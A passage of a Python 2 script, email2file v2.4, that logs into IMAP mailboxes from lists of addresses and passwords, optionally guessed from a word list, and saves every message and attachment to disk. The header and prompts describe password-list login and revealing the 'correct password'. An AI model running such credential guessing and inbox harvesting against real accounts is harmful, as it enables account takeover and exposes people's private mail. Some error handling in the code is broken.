#!/usr/bin/env python
#
##### EMAIL2FILE v2.4!
##### AUTHOR: vvn < root @ nobody . ninja >
##### VERSION RELEASE: March 20, 2017
##### GPG KEY ID: D52CB53F
##### GPG fingerprint: E8EA 199E 7F78 DA61 63F7  0477 41E3 DA23 D52C B53F
#
##### SAVE EMAIL LISTS AS PLAIN TEXT format in script directory with one address per line.
##### you can include the password, if known, as a base64-encoded string 
##### separated by a comma. just use "email@addy.com, encoded_password"
##### on each line instead. 
#####
##### PASSWORD LISTS SHOULD BE ONE PASSWORD PER LINE.
##### they can also be base64-encoded or encrypted. you can either run
##### "python encodelist.py" to base64-encode or "python encryptlist.py" to
##### encrypt the list, or select the option to encode or encrypt the list
##### while running this script (email2file.py). 
##### 
##### ENCRYPTION NOW FULLY WORKING FOR PASSWORD LISTS!
##### the feature has now been fully integrated into the main script!
##### use the encryption feature to securely store your password lists,
##### and decrypt them for use with the script. it is highly recommended
##### that you delete the plaintext files after script completes.
#####
##### YOUR ENCRYPTION KEY is stored as 'secret.key' by default, in the
##### current working directory. YOUR SECRET PASSPHRASE CANNOT BE RECOVERED
##### IF FORGOTTEN. the program cannot verify if an incorrect passphrase 
##### is entered during the decryption process, and the result will be
##### invalid data that is returned. do not forget your secret passphrase,
##### or write it down and store it in a secure location.
#
##### DECRYPTING GPG EMAILS WORKS NOW! YAY!
#
##### ALSO *FINALLY* GOT MULTIPLE FILE ATTACHMENTS WORKING! they even
##### get saved in the proper encoding!
#
##### not just multiple file attachments works now, you can also
##### decrypt ENCRYPTED FILE ATTACHMENTS automatically with your
##### GPG keyring!
#####
##### TO RUN SCRIPT: open terminal to script directory and enter:
##### "python email2file.py"
#
##### **PLEASE USE PYTHON 2.7.X AND NOT PYTHON 3**
#####   OR YOU WILL GET SYNTAX ERRORS!
#####
##### works best on OSX and linux systems, but you can try it on windows.
##### i even went to the trouble of trying to remove ANSI color codes for you
##### windows users, so you'd better use it! if you are on windows, you can
##### install the colorama or ansiterm python module to support ANSI colors.
##### if you have setuptools or pip installed, you can easily get it by 
##### opening a MS-DOS window as administrator and typing the following:
#####     "pip install colorama" or "pip install ansiterm"
##### you can get pip by entering: "easy_install pip"
#####
##### depending on the text encoding of the original email, each message
##### is saved as a TXT or HTM file. the files can be found in the
##### respective account subfolder within the 'emails' directory in
##### the current working directory, or a user-specified location.
##### for example, a message from sender@email.com with subject "test"
##### in rich text format received at user@email.com will output to:
##### <cwd>/emails/user_email.com/01-"sender" <sender@email.com> .htm
##### where <cwd> is the current working directory. this can be changed
##### when running the program at the beginning.
#####
##### a file of all mail headers is also saved in the 'emails' directory.
##### it should be called user@email.com-headerlist-yyyy-mm-dd.txt
#####
##### attachments are saved either in account folder or 'attachments' subfolder.
#####
##### logs will be saved in the 'logs' folder inside the 'emails' directory
##### or the user-specified location.
#####
##### ****KNOWN BUGS v 2.40 (3/16/2017):****
##### - socket.error "[Errno 54] Connection reset by peer"
#####   will interrupt the script execution. in case that it happens,
#####   just start the script again:
#####     python email2file.py or chmod +x *.py && ./email2file.py
##### - GPG signature verification always seems to fail, usually with
#####   969 bytes-sized files named "signature.asc"
##### - i have not caught every single obscure parsing/encoding exception
#####   so don't freak if one happens. there are a couple i am currently
#####   working on that should hopefully be fixed in an upcoming update.
#####   please report any errors to vvn at root @ nobody . ninja
##### - yes there's a lot of redundant code and message content might
#####   get saved more than once because i wasn't sure what worked!
##### - loop through emails ends prematurely
#####
##### if you run tor and proxychains, you can run the script within proxychains:
#####   proxychains python email2file.py
#####
##### * latest release should always be found on github:
#####     http://github.com/eudemonics/email2file
##### * download using terminal command:
#####     git clone https://github.com/eudemonics/email2file.git email2file
##################################################
##################################################
##### USER LICENSE AGREEMENT & DISCLAIMER
##### copyright, copyleft (C) 2014-2017  vvn < root @ nobody . ninja >
#####
##### This program is FREE software: you can use it, redistribute it and/or modify
##### it as you wish. Copying and distribution of this file, with or without modification,
##### are permitted in any medium without royalty provided the copyright
##### notice and this notice are preserved. This program is offered AS-IS,
##### WITHOUT ANY WARRANTY; without even the implied warranty of
##### MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
##### GNU General Public License for more details.
##################################################
##################################################
##### getting credited for my work is nice. so are donations.
##### BTC: 1M511j1CHR8x7RYgakNdw1iF3ike2KehXh
##### https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=26PWMPCNKN28L
##### but to really show your appreciation, you should buy my EP instead!
##### you can stream and purchase it at: http://dreamcorp.us
##### (you might even enjoy listening to it)
##### and follow on facebook: https://facebook.com/dreamcorporation
##### i also run a news site, SNOOZE PRESS! visit here: http://snooze.press
#####
##### questions, comments, feedback, bugs, complaints, death threats, marriage proposals?
##### contact me at: root @ nobody [dot] ninja
##### there be only about two thousand lines of code after this -->

from __future__ import print_function
import email, base64, getpass, imaplib, threading
from email.header import decode_header
from email.parser import Parser
import re, sys, os, os.path, socket, time, traceback, logging
from subprocess import Popen
from datetime import datetime, date
from threading import Thread, Timer
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Util import Counter
from ansilist import ac

try:
   import gnupg
except:
   pass
   try:
      os.system('pip install python-gnupg')
      import gnupg
   except:
      pass
      print('\nunable to install gnupg module. you may need to run the \'easy_install python-gnupg\' command with administrator privileges. GPG decryption and signature validation will be disabled.\n')
      use_gpg = 0

colorintro = '''
\033[34m=====================================\033[33m
---------\033[36m EMAIL2FILE v2.4 \033[33m-----------
-------------------------------------
-----------\033[35m author : vvn \033[33m------------
---------\033[32m root@nobody.ninja \033[33m---------
\033[34m=====================================\033[33m
----\033[37m support my work: buy my EP! \033[33m----
--------\033[37m http://dreamcorp.us \033[33m--------
---\033[37m facebook.com/dreamcorporation \033[33m---
------\033[32m thanks for the support! \033[33m------
\033[34m=====================================\n\033[0m
'''

cleanintro = '''
=====================================
--------- EMAIL2FILE v2.4 -----------
-------------------------------------
----------- author : vvn ------------
--------- root@nobody.ninja ---------
=====================================
---- support my work: buy my EP! ----
-------- http://dreamcorp.us --------
--- facebook.com/dreamcorporation ---
------ thanks for the support! ------
=====================================
'''

global usecolor
global emailaddr
global imap_server
global completed

if os.name == 'nt' or sys.platform == 'win32':
   try:
      import colorama
      colorama.init()
      usecolor = "color"
      progintro = colorintro
   except:
      pass
      try:
         os.system('pip install colorama')
         import colorama
         colorama.init()
         usecolor = "color"
         progintro = colorintro
      except:
         pass
         try:
            import tendo.ansiterm
            usecolor = "color"
            progintro = colorintro
         
         except:
            usecolor = "clean"
            progintro = cleanintro
            pass
else:
   usecolor = "color"
   progintro = colorintro


scriptpath = os.path.realpath(sys.argv[0])
scriptdir = os.path.dirname(scriptpath)
sys.path.insert(0, scriptdir)
#print('***DEBUG*** \nscript path: %s \nscript dir: %s \n' % (scriptpath, scriptdir))
print(progintro)

time.sleep(0.9)

############################
#      START PROGRAM       #
############################

# CHECK IF SINGLE EMAIL (1) OR LIST OF MULTIPLE EMAIL ADDRESSES IS USED (2)
print('''
\033[34;1mSINGLE EMAIL ADDRESS OR LIST OF MULTIPLE EMAIL ADDRESSES?\033[0m
list of multiple email addresses must be in text format
with one email address per line. PASSWORD LIST with one
password per line in plain text or base64 encoded format
supported. ENCRYPTION MODULE also now fully supported! To
encrypt password list, run \033[36;1mpython encryptlist.py\033[0m.
***ALSO SUPPORTS EMAIL AND PASSWORD IN A SINGLE FILE:***
one email address + one password (plaintext or base64 encoded)
per line separated by a comma (example@domain.com, password)
''')
qtyemail = raw_input('enter 1 for single email or 2 for multiple emails --> ')

print('')

while not re.search(r'^[12]$', qtyemail):
   qtyemail = raw_input('invalid entry. enter 1 for a single email address, or enter 2 to specify a list of multiple email addresses in text format --> ')

# CHECK IF WORD LIST USED FOR PASSWORD
usewordlist = raw_input('do you want to use a word list rather than supply a password? enter Y/N --> ')
while not re.search(r'^[nyNY]$', usewordlist):
   usewordlist = raw_input('invalid entry. enter Y to use word list or N to supply password --> ')

print('')

# SET DOWNLOAD DIRECTORY
changedir = raw_input('inbox contents will be saved to \'emails\' folder by default. would you like to change this? Y/N --> ')
while not re.search(r'^[nyNY]$', changedir):
   changedir = raw_input('invalid entry. enter Y to change save directory or N to use default --> ')

print('')
homedir = os.path.expanduser("~")
gpgdir = os.path.join(homedir, '.gnupg')
cwd = os.getcwd()
outputdir = 'emails'
savedir = os.path.join(cwd, outputdir)
completed = []

if changedir.lower() == 'y':
   savedir = raw_input('please enter the full path of where to save inbox contents --> ')
   if os.name == 'nt' or sys.platform == 'win32':
      matchstr = r'^[a-zA-Z]:\\(((?![<>:"/\\|?*]).)+((?<![ .])\\)?)*$'
   else:
      matchstr = r'^[^\0]+$'
   while not re.match(matchstr, savedir):
      savedir = raw_input('invalid path. please enter a valid output directory --> ')
      print('')

if not os.path.exists(savedir):
   os.makedirs(savedir, 0755)
ustimefmt = lambda a: date.strftime(a,"%m/%d/%Y %I:%M%p")
today = datetime.now()
today = date.strftime(today,"%m-%d-%Y")
logdir = os.path.join(savedir, 'logs')
if not os.path.exists(logdir):
   os.makedirs(logdir, 0755)
logfile = 'email2file-' + today + '.log'
logfile = os.path.join(logdir, logfile)

logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s %(levelname)-8s %(message)s',
                    datefmt='%a, %d %b %Y %I:%M%p',
                    filename=logfile,
                    filemode='ab+')

print('')

# CHECK IF SSL USED TO CONNECT TO IMAP SERVER
usesslcheck = raw_input('use SSL? Y/N --> ')

while not re.search(r'^[nyNY]$', usesslcheck):
   usesslcheck = raw_input('invalid selection. please enter Y for SSL or N for unencrypted connection. -->')

sslcon = 'yes'

if usesslcheck.lower() == 'n':
   sslcon = 'no'

else:
   sslcon = 'yes'

passprompt = 0

if usewordlist.lower() == 'y':
   
   print('''
prompt with option to reveal correct password in terminal
after successful login?
%s**entering Y will pause the program to wait for user input!** \033[0m
%s**enter N to let the script run without interruptions**\033[0m
''' % (ac.OKPINK, ac.BLUEBOLD))

   showpasscheck = raw_input('please enter Y/N --> ')
   
   while not re.search(r'^[nyNY]$', showpasscheck):
      showpasscheck = raw_input('invalid entry. please enter Y to ask if you want the correct password revealed upon successful login, or N to let the script run uninterrupted --> ')

   if showpasscheck.lower() == 'y':
      passprompt = 1

   else:
      passprompt = 0

   print('')
   
# FUNCTION TO RESOLVE IMAP SERVER
def resolveimap(imap_server):
   server_ip = imap_server
   resolved_ips = []

   try:
      nscheck = socket.getaddrinfo(imap_server,0,0,0,0)
      for result in nscheck:
         resolved_ips = list(set(result))

   except socket.error as e:
      pass
      logging.warning('unable to resolve %s' % imap_server)
      logging.warning('caught exception: %s' % str(e))
      if usecolor == 'color':
         print(ac.YELLOW + 'ERROR: ' + ac.OKAQUA + 'could not resolve ' + ac.OKPINK + imap_server + ac.CLEAR)
      else:
         print('ERROR: could not resolve %s' % imap_server)
      
      print('\nerror: %s \n' % str(e))
      imap_server = raw_input('please enter a valid IMAP server --> ')
      while not re.search(r'^[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,15})$', imap_server):
         imap_server = raw_input('invalid hostname. please enter a valid IMAP server --> ')
         print('')
      nscheck = socket.getaddrinfo(imap_server,0)
      for result in nscheck:
         resolved_ips = list(set(result))
      #print(resolved_ips)
   
   finally:
      
      if len(resolved_ips) > 1:
         if len(str(resolved_ips[3])) > 1:
            server_ip = resolved_ips[3][0]
         else:
            server_ip = resolved_ips[4][0]
         if usecolor == 'color':
            showip = ac.GREENBOLD + str(server_ip) + ac.CLEAR
         else:
            showip = str(server_ip)
         print('\nRESOLVED SERVER TO: %s \n' % showip)
      
         logging.info('resolved %s to: %s' % (imap_server, server_ip))
      
      else:
         print('\nERROR: no response from DNS server; could not resolve %s.\n' % imap_server)
         logging.warning('no response from DNS server. unable to resolve %s.' % imap_server)
         
   return imap_server, server_ip

# FUNCTION TO CHECK LOGIN CREDENTIALS
def checklogin(emailaddr, emailpass, imap_server, sslcon):

   global checkresp
   
   loginstatus = 'BAD'
   
   efmatch = re.search(r'^[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,15})$', emailaddr)
   while not efmatch:
      emailaddr = raw_input('invalid email format. enter a valid email address --> ')
      print('')

   imap_port = 993

   if 'no' in sslcon:
      imap_port = 143

      if 'gmail.com' in emaildomain:
         imap_port = 587

   if 'yes' in sslcon:
      server = imaplib.IMAP4_SSL(imap_server, imap_port)

   else:
      server = imaplib.IMAP4(imap_server, imap_port)

   checkresp = 'preconnect'
   if usecolor == 'color':
      print('\nattempting to log onto: ' + ac.GREEN + emailaddr + ac.CLEAR)
   else:
      print('\nattempting to log onto: %s' % emailaddr)
   
   logging.info('attempting to connect to IMAP server to check login credentials for account %s' % emailaddr)

   try:

      loginstatus, logindata = server.login(emailaddr, emailpass)
      
      loginstatus = str(loginstatus)

      if 'OK' in loginstatus:
         if usecolor == 'color':
            print(ac.WHITEBOLD + '\nLOGIN SUCCESSFUL: ' + ac.PINKBOLD + emailaddr + ac.CLEAR + '\n')
         else:
            print('\nLOGIN SUCCESSFUL: %s\n' % emailaddr)
         logging.info('INFO: LOGIN successful for account %s' % emailaddr)
         checkresp = 'OK'

      elif 'AUTHENTICATIONFAILED' in loginstatus:
         loginmsg = '\nLOGIN FAILED: %s with %s \n' % (loginstatus, logindata)
         print(loginmsg)
         logging.warning('ERROR: %s for account %s') % (loginmsg, emailaddr)
         checkresp = 'AUTHENFAIL'

      elif 'PRIVACYREQUIRED' in loginstatus:
         loginmsg = '\nLOGIN FAILED: %s with %s \n' % (loginstatus, logindata)
         print(loginmsg)
         logging.warning('ERROR: %s for account %s') % (loginmsg, emailaddr)
         checkresp = 'PRIVACYREQ'

      elif 'UNAVAILABLE' in loginstatus:
         loginmsg = '\nLOGIN FAILED: %s with %s \n' % (loginstatus, logindata)
         print(loginmsg)
         logging.warning('ERROR: %s for account %s') % (loginmsg, emailaddr)
         checkresp = 'UNAVAIL'

      elif 'AUTHORIZATIONFAILED' in loginstatus:
         loginmsg = '\nLOGIN FAILED: %s with %s \n' % (loginstatus, logindata)
         print(loginmsg)
         logging.warning('ERROR: %s for account %s') % (loginmsg, emailaddr)
         checkresp = 'AUTHORFAIL'

      elif 'EXPIRED' in loginstatus:
         loginmsg = '\nLOGIN FAILED: %s with %s \n' % (loginstatus, logindata)
         print(loginmsg)
         logging.warning('ERROR: %s for account %s') % (loginmsg, emailaddr)
         checkresp = 'EXPIRED'

      elif 'CONTACTADMIN' in loginstatus:
         loginmsg = '\nLOGIN FAILED: %s \n' % loginstatus
         print(loginmsg)
         logging.warning('%s for account %s') % (loginmsg, emailaddr)
         checkresp = 'ADMINREQ'

      else:
         print('\nUnable to connect: %s \n' % emailaddr)
         logging.error('%s for account %s') % (loginstatus, emailaddr)
         checkresp = 'UNKNOWN'
         
   except IOError as e:
      pass
      if usecolor == 'color':
         print('\nconnection attempt to ' + ac.PINKBOLD + emailaddr + ac.CLEAR + ' failed with IO error: \n' + ac.AQUA + str(e) + ' \n' + ac.CLEAR)
      else:
         print('\nconnection attempt to %s failed with IO error: \n%s \n' % (emailaddr, str(e)))
      logging.error('IO ERROR: %s for account %s') % (str(e), emailaddr)
      checkresp = 'IOERROR'
   
   except socket.error as e:
      pass
      if usecolor == 'color':
         print('\nconnection attempt to ' + ac.PINKBOLD + emailaddr + ac.CLEAR + ' failed with socket error: \n' + ac.AQUA + str(e) + ' \n' + ac.CLEAR)
      else:
         print('\nconnection attempt to %s failed with socket error: \n%s \n' % (emailaddr, str(e)))
      logging.error('SOCKET ERROR: %s for account %s') % (str(e), emailaddr)
      checkresp = 'SOCKETERROR'

   except server.error as e:
      pass
      if usecolor == 'color':
         print('\nconnection attempt to ' + ac.PINKBOLD + emailaddr + ac.CLEAR + ' failed with IMAP error: \n' + ac.AQUA + str(e) + ' \n' + ac.CLEAR)
      else:
         print('\nconnection attempt to %s failed with IMAP error: \n%s \n' % (emailaddr, str(e)))
      logging.error('IMAPLIB ERROR: ' + str(e) + ' for account ' + emailaddr)
      checkresp = 'IMAPERROR'

      if 'BAD' in str(e):
         if usecolor == 'color':
            print('\nerror connecting to ' + ac.PINKBOLD + emailaddr + ac.CLEAR + ': \n' + ac.AQUA + str(e) + ' \n' + ac.CLEAR)
         else:
            print('\nerror connecting to %s: \n%s \n' % (emailaddr, str(e)))
         checkresp = 'BAD'
         logging.error('BAD RESPONSE: connection to %s failed with error - %s \n' % (emailaddr, str(e)))
      else:
         checkresp = checkresp + 'ERROR'

   except socket.timeout as e:
      pass
      print('SOCKET TIMEOUT: %s' % str(e))
      logging.error(str(e) + ' - Socket timeout while logging onto account ' + str(emailaddr))
      checkresp = 'TIMEOUT'

   except:
      pass
      
      if 'OK' in loginstatus:
         if usecolor == 'color':
            print(ac.WHITEBOLD + '\nLOGIN SUCCESSFUL: ' + ac.PINKBOLD + emailaddr + ac.CLEAR + '\n')
         else:
            print('\nLOGIN SUCCESSFUL: %s \n' % emailaddr)
         logging.info('LOGIN successful for account %s' % emailaddr)
         checkresp = 'OK'
      
      else:
         checkimap = raw_input('error logging onto ' + imap_server + '. to use a different IMAP server, enter it here. else, press ENTER to continue --> ')
         logging.warning('UNKNOWN ERROR occurred while trying to log onto account %s' % emailaddr)
         if len(checkimap) > 0:
            while not re.search(r'^[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,15})$', checkimap):
               checkimap = raw_input('invalid format. please enter a valid IMAP server --> ')
            imap_server = checkimap
         
         if 'yes' in sslcon:
            server = imaplib.IMAP4_SSL(imap_server, imap_port)
         else:
            server = imaplib.IMAP4(imap_server, imap_port)
         
         try:
            loginstatus, logindata = server.login(emailaddr, emailpass)
            if 'OK' in loginstatus:
               checkresp = 'OK'
            else:
               checkresp = loginstatus[:8]
         
         except e: 
            pass
            logging.error('exception occurred while attempting logon for %s: %s' % (emailaddr, str(e)))
            checkresp = 'OTHERERROR'
      
   return checkresp
# END OF FUNCTION checklogin()

# FUNCTION TO CHECK FOR EMAIL FORMAT ERRORS BEFORE SUBMITTING TO SERVER
def checkformat(emailaddr):

   emailformat = "unchecked"

   match = re.search(r'^[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,16})$', emailaddr)

   if not match:
      emailformat = "bad"
      logging.warning('bad email address format for entry: %s' % str(emailaddr))
      if usecolor == 'color':
         print('\033[31minvalid email format \033[0m\n')
      else:
         print('invalid email format')
   
   else:
      emailformat = "good"
      logging.info('email address is valid: %s' % emailaddr)
      if usecolor == 'color':
         print('\n\033[36memail address is valid \033[0m\n')
      else:
         print('\nemail address is valid\n')
   
   return emailformat
# END OF FUNCTION checkformat()

# FUNCTION TO PARSE MULTIPART EMAIL PAYLOAD
def decode_email(msg):
 
   text = ""
   att = False
   html = None
   pars = msg.get_payload()
   pars = str(msg)
   #msgdir = dir(msg)
   #parsdir = dir(pars)
   #msgwalk = msg.walk()
   
   #wa = [x for x in (msgdir, parsdir, msgwalk)]
   #print(wa)

   if type(msg) is str:
      parsed = msg
      #print('\n***: returning msg as parsed\n')
      logging.info('returned msg as parsed')
      return parsed # nothing more to parse
   
   elif msg.get_payload() is None:
      #print('\n***DEBUG: returning msg as NoneType\n')
      logging.info('returned msg as NoneType')
      return msg
   
   else:
   
      decoded = msg.get_payload()
      
      if decoded is None:
         #print('\n***DEBUG LINE 599: returning decoded as NoneType\n')
         return msg
         
      msgfrom = ''
      mdate = ''
      msgto = ''
      msgsubject = ''
      
      if msg['From']:
         msgfrom = msg['From']
         msgfrom = msgfrom.replace('/', '-')
         msgfrom = msgfrom.replace('<', ' ')
         msgfrom = msgfrom.replace('>', '')
      
      mdate = msg['Date']
      
      msgto = completed[-1]
      
      if msgto:
         print('completed email: %s \n' % str(msgto))
      else:
         msgto = msg['Envelope-to']
         print('env to: %s \n' % str(msgto))
      
      msgid = msg['Email-id']
      
      if msgto is None:
         msgto = msg['To']
         print('msg to: %s \n' % str(msgto))
         if msgto is None:
            msgto = msg['Cc']
            print('msg cc: %s \n' % str(msgto))
            if msgto is None:
               msgto = msg['Bcc']
               print('msg bcc: %s \n' % str(msgto))
            
      msgto = msgto.replace('/', '-')
      msgto = msgto.replace('<', ' ')
      msgto = msgto.replace('>', '')
      
      msgto = str(msgto)
         
      msgdate = mdate[5:][:11]

      if msg['Subject']:
         msgsubject = msg['Subject'].replace('/', '-')
      else:
         msgsubject = 'No Subject'
      rootdir = savedir
      atdomain = re.search("@.*", msgto).group()
      emaildomain = str(atdomain[1:])
      j = len(msgto) - len(atdomain)
      user_save = msgto[:j]

      subdir =  user_save + "_" + emaildomain
      save_path = os.path.join(rootdir, subdir)

      if not os.path.exists(save_path):
         os.makedirs(save_path)
      
      att_dir = os.path.join(save_path, 'attachments')
      if not os.path.exists(att_dir):
         os.makedirs(att_dir)

      # MULTITYPE CHECK
      decoded = msg.get_payload()	
      content_type = msg.get_content_type()      
      multitypes = ['multipart', 'alternative', 'application', 'related']
      charset = msg.get_content_charset()
      
      print("\033[32mContent-Type: %s \nCharset: %s \n\033[0m" % (content_type, charset))
      
      # plain text format
      if content_type == 'text/plain':
         att = False
         decoded = unicode(msg.get_payload(decode=True), str(charset), "ignore").encode('utf8', 'replace').strip()
         enc = msg['Content-Transfer-Encoding']
         if enc == "base64":
            decoded = msg.get_payload()
            decoded = base64.decodestring(decoded)

      # rich text/html format
      elif content_type == 'text/html':
         att = False
         decoded = unicode(msg.get_payload(decode=True), str(charset), "ignore").encode('utf8', 'replace').strip()
      
      if any(x in content_type for x in multitypes):
         #print("\033[35m***DEBUG*** \n\033[33mLINE 607: MULTITYPE: %s \n\033[0m" % content_type)
         att = True
         n = 0
         lim = len(decoded) - 1
         attfile = msg.get_filename()
         attachment = msg.get_payload(decode=True)
         if attfile is None:
            attfile = decoded[n].get_filename()
            attachment = decoded[n].get_payload()
            att_contype = decoded[n].get_content_type()
         else:
            att_contype = msg.get_content_type()
         #print("***DEBUG*** \n\033[36mLINE 616 \n\033[31mLIMIT: %d \033[0m \nATTACHMENT FILE: %s \n\n" % (lim, attfile))
         
         while attfile is None and n < lim:
            n += 1
            attfile = decoded[n].get_filename()
            print("\033[95m\nDECODED ATTACHMENT FILE #%d: %s \033[0m\n\n" % (n, attfile))
            attachment = decoded[n].get_payload()
            att_contype = decoded[n].get_content_type()
            
            #  CHECK MULTIPART CONTENT TYPE #
            if 'multipart' in att_contype:
               for att in attachment:
                  att_data = att.get_payload(decode=True)
                  att_type = att.get_content_type()
                  if 'plain' in att_type:
                     att_name = msgfrom + '-' + msgsubject + '.txt'
                  elif 'html' in att_type:
                     att_name = msgfrom + '-' + msgsubject + '.html'
                  else: 
                     att_name = att.get_filename()
                     att_name = os.path.join(att_dir, str(att_name))
                  filename = att_name
                  if not os.path.isfile(filename):
                     try:
                        writedata = open(filename, 'wb+')
                        writedata.write(att_data)
                        writedata.close()
                        print('\nsaved attachment (try #1): %s \n' % filename)
                        logging.info('saved attachment: %s' % filename)
                     except:
                        pass
                        try:
                           writedata = open(filename, 'wb+')
                           writedata.write(att.get_payload())
                           writedata.close()
                           print('\nsaved attachment (try #2): %s \n' % filename)
                           logging.info('saved attachment: %s' % filename)
                        except e:
                           print('\nan error has occurred: %s \n' % str(e))
                           logging.error('an error occurred while trying to write file %s: %s' % (filename, str(e)))  
         
            else:
               if 'html' in att_contype:
                  att_name = msgfrom + '-' + msgsubject + '-' + msgdate + '.html'
               elif 'plain' in att_contype:
                  att_name = msgfrom + '-' + msgsubject + '-' + msgdate + '.txt'
               else:
                  att_name = msgfrom + '-' + msgsubject + '-' + attfile
               filename = os.path.join(att_dir, str(att_name))
               if not os.path.isfile(filename):
                  try:
                     writedata = open(filename, 'wb+')
                     writedata.write(attachment)
                     writedata.close()
                     print('\n\033[31m**attachment saved to file successfully*** \033[0m \nFILE LOCATION: %s \n' % filename)
                     logging.info('saved attachment: %s' % filename)
                  except:
                     pass
                     print('\n***skipped exception, MOVING ON.. \n')
                     logging.warning('passed exception trying to save %s. trying again..' % filename)
                     try:
                        writedata = open(filename, 'wb+')
                        writedata.write(attachment.get_payload())
                        writedata.close()
                        print('\nsaved attachment: %s \n' % filename)
                        logging.info('saved attachment: %s' % filename)
                     except e:
                        print('\nan error has occurred: %s \n' % str(e))
                        logging.error('an error occurred while trying to write file %s: %s' % (filename, str(e)))   
         
         if attfile is None:
            filename = msgfrom + '-' + msgsubject + '-' + msgdate + '.txt'
         else:
            filename = msgsubject + '-' + str(attfile)
      
         filename = os.path.join(att_dir, filename)
         
         if not os.path.isfile(filename):
            try:
               writedata = open(filename, 'wb+')
               writedata.write(attachment)
               writedata.close()
               print('\nsaved attachment attempt #1: %s \n' % filename)
               logging.info('saved attachment: %s' % filename)
            except:
               pass
               try:
                  writedata = open(filename, 'wb+')
                  writedata.write(attachment.get_payload(decode=True))
                  writedata.close()
                  #print('\n***DEBUG*** \nLINE 788: \nsaved attachment: %s \n' % filename)
                  logging.info('saved attachment attempt #2: %s' % filename)
               except:
                  pass
                  logging.error('an error occurred while trying to write file %s' % filename)
         else:
            
            if usecolor == 'color':
               print('\n\033[33m' + filename + '\033[0m already exists, skipping.. \n')
            else:
               print('\n' + filename + ' already exists, skipping.. \n')
            logging.info('skipping existing file: %s' % filename)
      
      else:
         return decoded
         
      for part in decoded:
         
         filename = part.get_filename()
         
         # get content type and character set
         contype = part.get_content_type()
         charset = part.get_content_charset()
         print("\033[31mContent-Type: %s \nCharset: %s \n\033[0m" % (contype, charset))
         
         if charset is None: # probably a file attachment theni
            text = part.get_payload(decode=True)
            continue
         
         # plain text format
         if part.get_content_type() == 'text/plain':
            text = unicode(part.get_payload(decode=True), str(charset), "ignore").encode('utf8', 'replace').strip()
            enc = part['Content-Transfer-Encoding']
            if enc == "base64":
               text = part.get_payload()
               text = base64.decodestring(text)

         # rich text/html format
         elif part.get_content_type() == 'text/html':
            html = unicode(part.get_payload(decode=True), str(charset), "ignore").encode('utf8', 'replace').strip()

         elif part.get('Content-Disposition') is None:
            continue
         
         # p7s signature
         elif part.get_content_type() == 'application/pkcs7-signature':
            att = True
            sigdata = part.get_payload(decode=True)
            if sigdata is None:
               sigdata = part.get_payload()
            signame = 'sig.p7s'
            if part.get_filename() is None:
               signame = msgfrom + '-' + msgsubject + '-' + msgdate + '.p7s'
            else:
               signame = msgfrom + '-' + msgdate + '-' + part.get_filename()
            att_path = os.path.join(att_dir, signame)
            sigfile = open(att_path, 'wb+')
            sigfile.write(sigdata)
            sigfile.close()
            logging.info('saved signature file: %s' % signame)
            print('saved signature file to disk: %s' % signame)
            
         
         # message contains attachments
         elif any(x in part.get_content_type() for x in multitypes):
            att = True
            # text of message
            a = part.get_payload(0)
            # attachments
            b = part.get_payload(1)
            
            # plain text message
            if a.get_content_type() == 'text/plain':
               text = a
               if a['Content-Transfer-Encoding'] == 'base64':
                  text = a.get_payload()
                  text = base64.decodestring(text)
            # html or rich-text format
            elif a.get_content_type() == 'text/html':
               html = unicode(a.get_payload(decode=True), str(charset), "ignore").encode('utf8', 'replace').strip()
               
            # attachments
            if part.get_filename() is not None:
               file_name = part.get_filename()
               complete_name = os.path.join(att_dir, file_name)
               if not os.path.isfile(complete_name):
                  try:
                     attachment = part.get_payload()
                     partdata = open(complete_name, 'wb+')
                     partdata.write(attachment)
                     partdata.close()
                     print('\nsaved attachment: %s \n' % complete_name)
                     logging.info('saved attachment: %s' % complete_name)
                  except:
                     pass
                     try:
                        attachment = part.get_payload(decode=True)
                        partdata = open(complete_name, 'wb+')
                        partdata.write(attachment)
                        partata.close()
                        print('\nsaved attachment: %s \n' % complete_name)
                        logging.info('saved attachment: %s' % complete_name)
                     except e:
                        pass
                        print('\nan error has occurred while trying to save attachment %s: %s \n' % (complete_name,str(e)))
                        logging.error('an error occurred while trying to save attachment %s: %s' % (complete_name,str(e)))
               
            elif "multipart" or "application" in b.get_content_type():
               for bsub in b.get_payload():
                  bnext = bsub.get_payload(decode=True)
                  attachment = bnext
                  bname = bsub.get_filename()
                  
                  if bname is None:
                     text = bnext
                     btype = bsub.get_content_type()
                     print('\nbtype:\n%s \n' % btype)
                     print('\ntext:\n%s \n' % text)
                     bname = msgfrom + '-' + msgsubject + '-' + msgdate + '.txt'
                  else:
                     bname = msgfrom + '-' + msgdate + '-' + bname
                  
                  bfilename = os.path.join(att_dir, bname)
                     
                  if bnext is None: # possibly more attachments within
                     try:
                        attachment = decode_email(bsub)
                        bdata = open(bfilename, 'wb+')
                        bdata.write(attachment)
                        bdata.close()
                        print('\nsaved attachment: %s \n' % bname)
                        logging.info('saved attachment: %s' % bname)
                     except:
                        pass
                        try:
                           attachment = bsub
                           bdata = open(bfilename, 'wb+')
                           bdata.write(attachment)
                           bdata.close()
                           print('\nsaved attachment: %s \n' % bname)
                           logging.info('saved attachment: %s' % bname)
                        except e:
                           print('\nan error has occurred: %s \n' % str(e))
                           logging.error('an error has occurred: %s' % str(e))
                  else:
                     try:
                        bdata = open(bfilename, 'wb+')
                        bdata.write(bnext)
                        bdata.close()
                        print('\nsaved attachment: %s \n' % bname)
                        logging.info('saved attachment: %s' % bname)
                        attachment = bnext
                     except e:
                        pass
                        print('\nan error has occurred: %s \n' % str(e))
                        logging.error('an error has occurred: %s' % str(e))

            else:
               text = part.get_payload(decode=True)
               continue 
                                   
         # PGP encrypted message or attachment      
         elif part.get_content_type() == 'application/pgp-encrypted' or part.get_content_type() == 'application/octet-stream':
            att = True
            text = part.get_payload(decode=True)
            for crypt in part.get_payload():
               if type(crypt) is str:
